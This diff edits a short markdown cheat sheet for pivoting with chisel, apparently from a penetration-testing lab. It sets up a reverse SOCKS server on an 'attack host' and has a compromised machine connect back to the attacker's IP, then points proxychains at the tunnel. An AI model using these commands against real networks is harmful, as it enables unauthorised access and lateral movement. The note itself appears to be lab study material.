@@ -1,15 +1,18 @@
 # ATTACK HOST
 ```
-sudo ./chisel server --reverse -v -p 1234 --socks5
+./chisel server -p 8000 --reverse
 ```
 
 # CONNECTING TO ATTACKER
 ```
-./chisel client -v 10.10.14.17:1234 R:socks
+ssh ubuntu@10.129.49.229
+chmod 744 ./chisel
+./chisel client 10.10.15.17:8000 R:1080:socks
 ```
 
 # MODIFYING /etc/proxychains.conf
 ```
+sudo nano /etc/proxychains.conf
 socks5 127.0.0.1 1080
 ```
 
